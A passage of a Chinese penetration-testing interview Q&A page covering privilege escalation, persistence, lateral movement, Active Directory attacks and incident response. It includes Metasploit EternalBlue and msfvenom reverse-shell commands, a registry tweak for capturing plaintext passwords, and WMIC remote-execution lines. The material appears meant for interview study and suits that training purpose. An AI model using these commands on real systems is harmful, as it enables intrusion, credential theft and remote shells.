Windows Server <span class="token number">2008</span> R2 			<span class="token comment">#IIS 7.5 </span>
Windows Server <span class="token number">2012</span> 			<span class="token comment">#IIS 8.0 </span>
Windows Server <span class="token number">2012</span> R2			<span class="token comment">#IIS 8.5 </span>
windows Server <span class="token number">2016</span>				<span class="token comment">#IIS 10</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>有哪些解析漏洞？</summary><p><strong>Apache解析漏洞</strong></p><blockquote><p>Apache 是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p><p>如 test.php.rar 会被apache解析成php</p></blockquote><p><strong>Nginx &lt;8.03 空字节代码执行漏洞</strong></p><blockquote><p>影响版本：0.5.,0.6，0.7 &lt;= 0.7.65，0.8 &lt;= 0.8.37</p><p>在图片中嵌入PHP代码然后通过访问，来执行其中的代码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>xxx.jpg%00.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></blockquote></details><details class="custom-container details"><summary>IIOP听说过吗，和什么类似？</summary><p>java RMI通信，也就是远程方法调用，默认是使用jrmp协议，也可以选择IIOP</p></details><details class="custom-container details"><summary>log4j2漏洞利用和原理？</summary></details><details class="custom-container details"><summary>WebLogic常见漏洞和原理？</summary></details><details class="custom-container details"><summary>Fastjson常见漏洞的利用和原理？</summary></details><details class="custom-container details"><summary>fastjson的反序列化和原生反序列化漏洞的区别是什么?</summary></details><details class="custom-container details"><summary>Shiro反序列化漏洞的成因、利用链、如何发现？</summary></details><details class="custom-container details"><summary>Struts2有哪些重点漏洞，如何形成的？</summary><p>1）Struts2是java的web框架</p><p>2）采取OGNL表达式，处理view层数据字符串到controller层转换成java对象</p><p>S2-045 影响范围较大</p><p>通过Content-Type这个header头，进而执行命令，通过Strus2对错误消息处理进行回显</p><p>S2-046 和S2-045一样</p><p>S2-016 影响范围非常大</p></details><details class="custom-container details"><summary>大概讲一下\`CommonCollections1\`的利用链，该利用链有什么样的限制?</summary></details><details class="custom-container details"><summary>单向代码执行链如何实现执行多条语句，如\`CommonCollections1\`</summary></details><details class="custom-container details"><summary>在tomcat中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗?</summary></details><details class="custom-container details"><summary>如何在不重启机器的前提下查杀内存马?</summary></details><details class="custom-container details"><summary>MS17-010 Enternal Blue 这个漏洞你怎么利用？</summary><p>MSF反弹shell</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>use exploit/windows/smb/ms17_010_eternalblue
<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp
show targets	<span class="token comment">#修改设置参数</span>
show options	<span class="token comment">#修改设置参数</span>
exploit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h3 id="权限提升" tabindex="-1"><a class="header-anchor" href="#权限提升" aria-hidden="true">#</a> 权限提升</h3><details class="custom-container details"><summary>如何提升系统权限？</summary><p><strong>Windows</strong></p><blockquote><p>1）查看系统补丁，用类似 CVE-2020-0787 这些系统漏洞提权</p><p>2）BypassUAC</p><p>3）烂土豆提权</p></blockquote><p><strong>Linux</strong></p><blockquote><p>Sudo滥用提权</p><p>SUID提权</p><p>内核漏洞提权（脏牛）</p></blockquote></details><details class="custom-container details"><summary>简单说下烂土豆提权提权原理？</summary><ul><li>烂土豆使用NTLM（NT LAN Manager）身份验证协议进行远程过程调用（RPC）连接。</li><li>烂土豆会创建一个伪造的RPC服务，并设置服务的安全描述符为允许系统管理员级别的权限。然后创建一个DCOM（Distributed Component Object Model）对象，并连接到伪造的RPC服务。</li><li>Windows会检查连接的安全描述符，由于设置了管理员级别的权限，Windows会将DCOM对象连接的进程升级为管理员权限，从而实现提权。</li></ul></details><details class="custom-container details"><summary>UAC是如何进行鉴权校验的? BypassUAC的常见方法有哪些?</summary><p>UAC通过访问控制列表(ACL)实现用户访问控制，ACL决定了拥有何种权限的用户/进程能访问某资源。</p><p>1）利用白名单程序</p><p>2）DLL劫持</p><p>3）COM劫持</p></details><details class="custom-container details"><summary>请简述脏牛漏洞提权的原理？</summary><p>该漏洞的原因是get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，</p><p>可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。</p><p>当我们向带有MAP_PRIVATE标记的只读文件映射区域写数据时，会产生一个映射文件的复制(COW)，对此区域的任何修改都不会写回原来的文件，</p><p>如果上述的竞态条件发生，就能成功的写回原来的文件。比如我们修改su或者passwd程序就可以达到root的目的。</p></details><details class="custom-container details"><summary>MySQL提权的方式有哪些？利用条件？</summary><p><strong>MOF提权</strong></p><p>root账户</p><p>03系统</p><p>mof目录可写</p><p>secure_file_priv为空表示对mysql导入导出不做限制 在my.ini可以配置</p><p><strong>UDF提权</strong></p><p>Create function 调用udf.dll，以系统权限执行系统命令</p></details><details class="custom-container details"><summary>SQL Server提权的方式有哪些？</summary><div class="language-mssql line-numbers-mode" data-ext="mssql"><pre class="language-mssql"><code>xp_cmdshell
SP_OACreate
Openrowset沙盒
SQL Server代理执行计划任务
CLR公共语言运行时通过.NET程序调用powershell执行系统命令
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>假设SQL Server为sa权限，如何不通过xp_cmdshell执行系统命令？</summary><p>1）有.net环境可以使用SQL Server的CLR（Common Language Runtime）功能创建一个CLR存储过程，其中使用C#编写的代码调用PowerShell来执行所需的系统命令。</p><p>2）安装了SQL Server Agent，可以创建一个作业（Job），在作业中设置步骤以执行所需的系统命令。使用<code>sp_start_job</code>存储过程来启动该作业，从而执行系统命令。</p></details><h3 id="权限维持" tabindex="-1"><a class="header-anchor" href="#权限维持" aria-hidden="true">#</a> 权限维持</h3><details class="custom-container details"><summary>Linux有哪几种后门实现方式？</summary><p>ssh软链接后门</p><p>增加超级用户帐号</p><p>SSH公钥登陆</p><p>Crontab定时任务</p><p>Rootkit工具包</p></details><details class="custom-container details"><summary>ssh软链接后门的原理是什么，可以通过该原理构造其他后门吗?</summary><p><code>/etc/pam.d/su</code> 中的<code>pam_rootok.so</code>使得UID为0的用户可以无需密码直接通过认证。</p><p>当通过特定端口连接SSH后，软链接文件为<code>/tmp/su</code>，应用就会寻找到<code>/etc/pam.d/su</code>作为配置文件，从而可以实现无密码登陆。</p></details><details class="custom-container details"><summary>Windows有哪几种后门实现方式？</summary><p>映像劫持Shift</p><p>添加影子账户</p><p>木马加入开机启动项</p></details><h3 id="通道构建" tabindex="-1"><a class="header-anchor" href="#通道构建" aria-hidden="true">#</a> 通道构建</h3><details class="custom-container details"><summary>常用哪些方式构建内网通道？</summary><p>SSH高权限端口转发</p><p>FRP反向代理</p></details><details class="custom-container details"><summary>目标不出网的情况下如何做内网通道，是什么原理？</summary><p>Neo-reGeorg正向代理</p><p>其原理为在本地建立监听，提供socket服务，将数据通过http/https传递到webshell上做中转</p><p>服务端通信原理是通过session来接收socket转发收到的内容</p></details><h3 id="横向渗透" tabindex="-1"><a class="header-anchor" href="#横向渗透" aria-hidden="true">#</a> 横向渗透</h3><details class="custom-container details"><summary>你有一个webshell但无法执行系统命令，无法上传，怎么进行内网渗透？</summary><p>假设这两个问题无法解决。</p><p>1）翻阅配置文件查找敏感信息</p><p>2）再通过漏洞点上传一个正向代理的webshell，尝试向内网其它脆弱资产横向移动</p></details><details class="custom-container details"><summary>你横向渗透的常用手法有哪些？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>抓hash和明文密码 -<span class="token operator">&gt;</span> hash传递和内网密码喷洒
翻阅配置文件查找敏感信息
获取历史凭证（history、浏览器、RDP连接凭证、xshell连接凭证）
弱口令
Web应用漏洞
系统漏洞ms17010
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>目标只开了139端口能否利用永恒之蓝？</summary><p>需要使用445端口的SMB文件共享服务，以ms17_010为例我试过关闭445是不行的</p></details><details class="custom-container details"><summary>内网渗透怎么获取服务器账号密码？</summary><p>1）mimkatz抓hash和明文密码</p><p>2）翻阅配置文件，历史记录</p><p>3）密码喷洒：同密码重复利用</p><p>4）暴力破解弱口令</p></details><details class="custom-container details"><summary>Mimikatz抓密码原理？</summary><ol><li><strong>进程注入</strong>： <ul><li>Mimikatz通过利用Windows进程注入技术，将自身的代码注入到<code>lsass.exe</code>进程中</li></ul></li><li><strong>抓取凭据</strong>： <ul><li>一旦Mimikatz成功地注入到目标进程中，它就可以访问该进程的内存空间，以获取其中保存的凭据信息。lsass.exe进程是Windows操作系统中的身份验证进程，负责处理用户登录的凭据。</li></ul></li></ol><p>如果目标用户在线则能提取到明文密码，或者提取到NTLM哈希值去离线解密。</p></details><details class="custom-container details"><summary>不用mimikatz怎么抓明文密码？</summary><p>DumpMinitool或者注册表导出hash，然后彩虹表离线破解。</p><p>彩虹表是通过预先计算大量的密码和其对应的哈希值，并将它们存储在一个巨大的数据表中，以便在需要时快速进行哈希值的反查找。</p></details><details class="custom-container details"><summary>Server 12限制了抓明文密码，怎么绕过？</summary><p>改注册表开启Wdigest+rundll32强制锁屏+等管理员重新登录即可抓</p></details><details class="custom-container details"><summary>哪个补丁导致了mimikatz无法利用，如何绕过?</summary><p>原理是从lsass进程抓取内存</p><p>Windows Server 2012 之后的版本默认关闭<code>Wdigest</code>，无法从内存中获取明文密码。</p><p>2012之前的版本安装了<code>KB2871997</code>，同样无法获取明文密码</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>开启和关闭Wdigest的命令

<span class="token comment">#开启，值为1</span>
reg <span class="token function">add</span> HKLM<span class="token punctuation">\\</span>SYSTEM<span class="token punctuation">\\</span>CurrentControlSet<span class="token punctuation">\\</span>Control<span class="token punctuation">\\</span>SecurityProviders<span class="token punctuation">\\</span>WDigest /v UseLogonCredential /t REG_DWORD /d <span class="token number">1</span> /f

<span class="token comment">#关闭，值为0</span>
reg <span class="token function">add</span> HKLM<span class="token punctuation">\\</span>SYSTEM<span class="token punctuation">\\</span>CurrentControlSet<span class="token punctuation">\\</span>Control<span class="token punctuation">\\</span>SecurityProviders<span class="token punctuation">\\</span>WDigest /v UseLogonCredential /t REG_DWORD /d <span class="token number">0</span> /f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>有哪些横向执行命令的方法？</summary><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>psexec
wmic
net use共享+计划任务+type命令
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>psexec的底层实现原理是什么?</summary><p>命名管道连接SMB共享</p></details><details class="custom-container details"><summary>psexec和wmic的区别？</summary><p>psexec会记录大量日志，wmic不会记录下日志，更为隐蔽。</p></details><details class="custom-container details"><summary>横向渗透中，wmic如何构造有回显的命令执行?</summary><p>WMIC进程调用把命令执行结果重定向到一个文本文件</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#WMIC进程调用</span>
WMIC /Node:192.168.1.120 /user:administrator /password:admin123 Process Call Create <span class="token string">&quot;cmd /c whoami &gt; C:\\Users\\Public\\Videos\\out.txt&quot;</span>

<span class="token comment">#利用type查看结果</span>
net use <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.159.130<span class="token punctuation">\\</span>c$
<span class="token builtin class-name">type</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.120<span class="token punctuation">\\</span>c$<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>Public<span class="token punctuation">\\</span>Videos<span class="token punctuation">\\</span>out.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>桌面有管理员会话，想要做会话劫持怎么做？</summary><p>首先提权到system权限，能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#查询已登陆的用户会话</span>
quser

<span class="token comment">#劫持用户会话</span>
tscon ID /dest:console
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>你入侵了一台非域成员主机，如何快速定位到其它域成员主机？</summary><p>PowerView 枚举域内登陆的用户</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>Import-Module .<span class="token punctuation">\\</span>powerview.ps1
Invoke-UserHunter
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>如何查询域管登录过的机器，查询原理又是什么?</summary><p>定位域管两种手段：日志和会话。</p><p>psloggedon工具查询，原理是检测注册表中HKEY_USERS的key值、调用了NetSessionEnum的API来判断谁登录过哪台机器。</p></details><details class="custom-container details"><summary>域控开放的常见端口有哪些？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">53</span>	<span class="token comment">#DNS Server</span>
<span class="token number">88</span>	<span class="token comment">#KDC 密钥分发中心</span>
<span class="token number">389</span>	<span class="token comment">#LDAP 轻量目录访问协议</span>
<span class="token number">445</span>	<span class="token comment">#SMB</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>如何查询域之间的信任关系？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>nltest /domain_trusts
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>内网KDC服务器开放在哪个端口，针对kerbores的攻击有哪些?</summary><p>哈希传递（PTH）、票据传递、金银票后门</p></details><details class="custom-container details"><summary>你是域成员，如何拿到域控制器？</summary><p>定位域控 net time /domain、 net group &quot;domain controllers&quot; /domain</p><p>1）通过抓取域管登陆服务器的hash（不断抓HASH+PTH攻击）</p><p>2）通过运维人员不恰当的密码管理（弱口令、Wiki系统等记录域高权限账户）</p><p>3）通过委派来获取域控权限</p><p>4）通过NTLM中继</p><p>5）通过域控相关的漏洞（ms14068、Zerologon、NoPAC、Print Spooler）</p></details><details class="custom-container details"><summary>内网渗透拿到了域控制器怎么维持权限？</summary><p>黄金票据后门</p><p>通过卷影拷贝导出ntds.dit获取域内所有用户hash</p></details><details class="custom-container details"><summary>黄金票据是什么？</summary><p>在域中，每个用户账号的票据都是由Krbtgt生成的，这个账号的密码，储存在域控服务上 。</p><p>TGT票据，因为它是由域账号<code>krbtgt</code>的<code>NTLM Hash</code>加密和签名的</p><p>伪造TGT票据跳过kerberos认证服务器认证过程获取任意server票据</p></details><details class="custom-container details"><summary>Wndows内网中NTLM协议认证过程？</summary><ol><li><strong>客户端请求认证</strong>： 用户在客户端系统上尝试访问资源（例如共享文件夹）。客户端会发送一个认证请求到服务器。</li><li><strong>服务器返回随机数</strong>： 服务器收到认证请求后，会生成一个随机数（称为Challenge），然后将其发送回给客户端。</li><li><strong>客户端响应</strong>： 客户端接收到服务器发送的Challenge后，会使用用户的密码和Challenge进行一系列计算，生成一个值，这个值被称为“Response”。</li><li><strong>客户端发送响应给服务器</strong>： 客户端将生成的Response发送回服务器作为答复。</li><li><strong>服务器验证</strong>： 服务器收到客户端发送的Response后，会使用存储在服务器上的用户密码的散列值来执行相同的计算。然后，服务器会比较客户端计算得到的Response和自己计算得到的Response是否匹配。</li><li><strong>服务器向域控制器验证</strong>： 如果服务器上的密码散列与客户端计算得到的Response匹配，服务器会向域控制器发送请求，请求确认该用户的密码是正确的。</li><li><strong>域控制器验证</strong>： 域控制器收到验证请求后，会将存储在Active Directory中的用户密码散列值与服务器发送的Response进行比较，以确认密码是否正确。如果一致，域控制器会向服务器发送确认信息。</li><li><strong>服务器授权访问</strong>： 一旦域控制器确认用户的密码正确无误，服务器会授予用户访问请求资源的权限。</li></ol></details><details class="custom-container details"><summary>NTLM relay的攻击场景有哪些，使用NTLM relay会受到哪些限制?</summary><p>攻击场景：Pass-the-Hash (PtH) 、Pass-the-Ticket (PtT)</p><p>限制：SMB签名禁用</p></details><details class="custom-container details"><summary>Windows中如何鉴别用户身份? SID是什么? 基于SID的SID History攻击原理是什么?</summary><p>SID安全标识符（Security Identifier），是Windows操作系统用于标识用户、组和计算机的唯一标识符</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wmic useraccount get Caption,sid
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>SID History攻击是一种利用Windows Active Directory中对象的SID历史属性进行攻击的方法。</p><p>当域内的对象（如用户、组）进行跨域移动时，会保留其原始的SID，并在目标域中创建一个新的SID。同时，原始SID将添加到目标域对象的SID历史属性中。这是为了确保跨域移动的对象能够继续访问先前授予其权限的资源。攻击者可以利用SID History属性来进行横向渗透和提权。</p><p>攻击原理如下：</p><ol><li><strong>获取目标域对象的SID History：</strong> 攻击者首先需要获取目标域中感兴趣的用户或组的SID History属性。这可能涉及到信息收集和对目标域探测。</li><li><strong>在攻击域中伪造SID：</strong> 接下来，攻击者会在自己控制的域中创建一个与目标域中用户或组的SID History相匹配的伪造SID。</li><li><strong>构造访问令牌：</strong> 攻击者使用伪造的SID构造一个访问令牌（access token）。访问令牌是用于表示身份和权限的数据结构，在Windows中用于控制对资源的访问。</li><li><strong>尝试访问目标资源：</strong> 使用伪造的访问令牌，攻击者尝试访问目标域中的资源。如果目标域没有适当的安全措施来防止SID History攻击，那么攻击者可能会成功获取资源的访问权限。</li></ol><p>SID History攻击的防御措施包括：</p><ul><li><strong>限制SID History的使用：</strong> 最好限制SID History的使用，仅在必要时才允许使用它，以减少横向渗透的风险。</li><li><strong>监控事件日志：</strong> 监控Windows事件日志，特别是关于安全主体的事件，可以帮助及早发现潜在的SID History攻击。</li><li><strong>强化域边界：</strong> 在网络边界和域边界实施安全策略，限制域之间的通信，可以帮助减少横向渗透的可能性。</li><li><strong>定期审查权限：</strong> 定期审查和清理域中的权限，删除不再需要的SID History，以及细化权限设置，可以提高安全性。</li></ul></details><h2 id="应急响应" tabindex="-1"><a class="header-anchor" href="#应急响应" aria-hidden="true">#</a> 应急响应</h2><details class="custom-container details"><summary>一台服务器被植入Webshell怎么办？</summary><p>1、清除Webshell：扫描网站目录，查找Webshell的位置，并删除</p><p>2、Web日志审计：根据Webshell创建时间，分析可疑的Web访问，找到漏洞位置，复现漏洞</p><p>3、修复漏洞，检查系统日志查看其它恶意活动，对服务器和Web应用进行安全加固</p></details><details class="custom-container details"><summary>服务器被植入挖矿病毒如何应对？</summary><p>1）分析网络流量找到挖矿病毒的进程和对外连接地址</p><p>2）根据挖矿病毒进程找到病毒文件样本，上传沙箱分析钱包地址</p><p>3）完全清除病毒样本加固服务器</p></details><details class="custom-container details"><summary>Linux基线加固思路？</summary><p>删除或禁用不必要账户( userdell、passwd -l )</p><p>检查是否存在空口令和root权限的账户</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">awk</span> -F: ‘<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token operator">==</span>””<span class="token punctuation">)</span>’ /etc/passwd
<span class="token function">awk</span> -F: ‘<span class="token punctuation">(</span><span class="token variable">$3</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>’ /etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>添加口令策略 (chage -m 0 -M 30 -E 2000-01-01 -W 7)，设置密码输错锁定</p><p>限制能su到root的用户(vi /etc/pam.d/su)</p><p>禁止root用户直接登录</p><p>关闭不必要的服务 ( systemctl disable 服务名)</p><p>加固SSH服务 ( 使用协议版本2，修改密码允许错误次数为3 )</p><p>设置umask 027 (vi /etc/profile)，即属主有全部权限，同用户组能读和执行，其它无权限；</p><p>设置登陆超时，(vi /etc/profuile)，TMOUT=180，登录三分钟后超时。</p><p>开启日志功能，syslogd日志(系统日志 /var/log/messages，安全日志 /var/log/secure)；</p></details><details class="custom-container details"><summary>IPS和IDS的区别？</summary><p>常见网络安全设备</p><table><thead><tr><th>设备</th><th>功能</th><th>部署方式</th></tr></thead><tbody><tr><td>IDS</td><td>入侵检测系统（基于流量检测攻击）</td><td>旁路</td></tr><tr><td>IPS</td><td>入侵防御系统（基于入侵行为库阻断攻击）</td><td>串联</td></tr><tr><td>FireWall</td><td>防火墙（隔离网络边界控制数据交互）</td><td>串联</td></tr><tr><td>WAF</td><td>Web应用防火墙（基于规则阻断针对Web应用的攻击）</td><td>串联</td></tr><tr><td>GAP</td><td>网闸（信息交换与安全隔离，逻辑隔离）</td><td>串联</td></tr><tr><td>FGAP</td><td>光闸（单项信息传输，逻辑隔离）</td><td>串联</td></tr><tr><td>堡垒机</td><td>运维安全审计系统（身份验证、账号管理、授权控制、安全审计）</td><td>旁路</td></tr><tr><td>DBAudit</td><td>数据库审计（实时记录网络上的数据库活动）</td><td>流量镜像</td></tr><tr><td>AV/EDR</td><td>终端安全（基于特征和行为等查杀危险程序和进程）</td><td>终端安装</td></tr><tr><td>SOC</td><td>安全运营中心（协调所有安全技术提高检测、响应和预防能力）</td><td></td></tr></tbody></table></details><details class="custom-container details"><summary>AV和EDR有何区别？</summary><p><strong>AV</strong>（Antivirus）是传统的安全防护技术，它主要依靠已知的病毒特征库来检测和防御病毒。</p><p>当一个文件被扫描时，AV软件会将其与病毒特征库中的已知病毒特征进行比较。</p><p>如文件与任何一个已知的病毒特征匹配，AV将标记该文件为恶意软件并采取适当的措施来保护系统。</p><p><strong>EDR</strong>（Endpoint Detection and Response）则是一种新兴的安全防护技术，它不仅能够检测已知的病毒，还可以发现和响应未知的威胁。</p><p>EDR软件在主机上运行，收集和分析主机的行为和活动数据，以便发现恶意活动。</p><p>EDR技术利用机器学习和人工智能等高级技术来识别异常行为，并使用防御措施来保护系统。</p></details><details class="custom-container details"><summary>从主机的层面，反弹shell如何监控？</summary><p>黑客一般会从最简单的TCP协议的反弹shell尝试</p><p>所以HIDS首先要监控基于TCP协议的输入流和输出流重定向流量</p></details><details class="custom-container details"><summary>Linux 中让命令在后台运行的方法有哪些？</summary><p>在命令后加**&amp;<strong>，已在前台运行的用</strong>crtl+z**暂停，然后用bg将作业放到后台；</p><p><strong>jobs -l</strong>可查看作业队列；<strong>fg</strong>可恢复到前台运行；</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>nohub ./test.sh <span class="token operator">&amp;</span> <span class="token comment">#守护进程</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>Rootkit的种类有哪些，针对不同种类的Rootkit应该如何防护以及检测？</summary><p>固件Rootkit</p><p>虚拟化Rootkit</p><p>内核级Rootkit</p><p>库级Rootkit</p><p>应用级Rootkit</p><p>Rootkit通过加载特殊驱动，修改系统内核隐藏自身及指定文件、进程和网络链接等。</p><p>可以使用chkrootkit工具检测，定期检查MD5、更新软件、安装杀软等方式防护</p><p>对于找出的 Rootkit，最好的应对方法便是擦除并重新安装系统</p></details><h2 id="安全开发-工具" tabindex="-1"><a class="header-anchor" href="#安全开发-工具" aria-hidden="true">#</a> 安全开发&amp;工具</h2><details class="custom-container details"><summary>Nmap扫描方式有哪几种？怎么扫描快？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">-sT</span>	<span class="token comment">#TCP全连接扫描</span>
<span class="token parameter variable">-sS</span>	<span class="token comment">#TCP SYN半连接扫描 ()</span>
<span class="token parameter variable">-sU</span>	<span class="token comment">#UDP</span>
<span class="token parameter variable">-sA</span>	<span class="token comment">#ACK</span>
<span class="token parameter variable">-sF</span>	<span class="token comment">#FIN</span>

<span class="token parameter variable">-T4</span>	<span class="token comment">#设置时序模板越高越快</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>MSF有哪些模块？</summary><table><thead><tr><th>辅 助 模 块 (Auxiliary，扫描器)</th><th>扫描主机系统，寻找可用漏洞；</th></tr></thead><tbody><tr><td>渗透攻击模块 (Exploits)</td><td>进行漏洞利用攻击；</td></tr><tr><td>攻击载荷模块 (Payloads)</td><td>生成攻击载荷（木马）；</td></tr><tr><td>后渗透攻击模块 (Post)</td><td>用于内网渗透的各种操作；</td></tr><tr><td>编 码 器 模 块 (Encoders)</td><td>选择编码技术，绕过杀软（或其他免杀方式）</td></tr></tbody></table><p>所有模块位置：**/usr/share/metasploit-framework/modules/</p></details><details class="custom-container details"><summary>MSF如何生成木马建立监听？</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msf <span class="token operator">&gt;</span> use exploit/multi/handler
msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp
<span class="token builtin class-name">set</span> LHOST
<span class="token builtin class-name">set</span> LPORT
run

msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8089</span> <span class="token parameter variable">-f</span> dll <span class="token operator">&gt;</span> shell.dll
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>SQLmap注入怎么用？</summary><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -r bp.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>子域名挖掘如何处理泛解析？</summary><p><strong>泛解析定义</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>泛域名解析是一种特殊的域名解析方式，它使用通配符*形式，设置域名解析。
它可以将没有明确设置的子域名一律解析到一个IP地址上。
这样，即使用户输入错误的子域名，也可以访问到域名持有者指定的IP地址。
但是信息收集中，这会造成请求的所有子域名都能访问的假象，从而收集到一堆无效的子域名。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>Onforall的处理方法</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>）随机生成3个子域名做DNS解析
<span class="token number">2</span>）如果没有都解析成功证明不是泛解析，都解析成功的话做HTTP请求判断
<span class="token number">3</span>）HTTP访问都成功则不是泛解析，反之则计算两两响应页面的相似度
<span class="token number">4</span>）有一组相似判断为不是泛解析，都不相似就是泛解析
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>自己的实现</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>）用一个绝对不存在的子域名去解析A记录，如有记录则存在泛解析
<span class="token number">2</span>）用不存在的子域名提取CNAME记录，作为泛解析对比标志
<span class="token number">3</span>）接下来的流程用Lookupcname解析剩余子域名，与泛解析标志做对比,如果不一样并且不为空则此子域名存在
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>Go编写的端口扫描器在Linux平台漏报原因？</summary><p>Golang的<code>net.DialTimeout</code>这个函数最终其实就是调用<code>linux socket</code></p><p>而linux中任何东西都是文件，同时linux默认允许同时打开的文件数是1024</p><p>协程数量大于1024就会导致socket链接建立失败，漏报大量端口</p><p>将open files数量设置大一点即可</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">ulimit</span> <span class="token parameter variable">-n</span> <span class="token number">10000</span>	<span class="token comment">#临时解决办法，当前终端生效</span>

<span class="token comment">#永久生效方法</span>
<span class="token builtin class-name">echo</span> <span class="token string">&quot;* soft nofile 65533&quot;</span> <span class="token operator">&gt;&gt;</span> /etc/security/limits.conf
<span class="token builtin class-name">echo</span> <span class="token string">&quot;* hard nofile 65533&quot;</span> <span class="token operator">&gt;&gt;</span> /etc/security/limits.conf
<span class="token builtin class-name">echo</span> session required /lib/security/pam_limits.so <span class="token operator">&gt;&gt;</span> /etc/pam.d/login
<span class="token comment">#重启系统</span>
